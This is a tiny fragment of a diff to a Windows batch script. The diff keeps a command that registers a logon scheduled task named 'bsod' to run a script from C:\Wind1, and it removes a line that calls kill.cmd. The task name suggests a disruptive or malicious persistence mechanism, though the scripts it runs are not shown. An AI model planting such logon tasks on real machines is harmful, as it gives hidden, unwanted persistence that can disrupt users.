@@ -31,4 +31,3 @@ if '%errorlevel%' NEQ '0' (
 SchTasks /Create  /SC ONLOGON /TN "bsod"  /TR  C:\Wind1\rnst.cmd
 
 
-C:\Wind1\kill.cmd
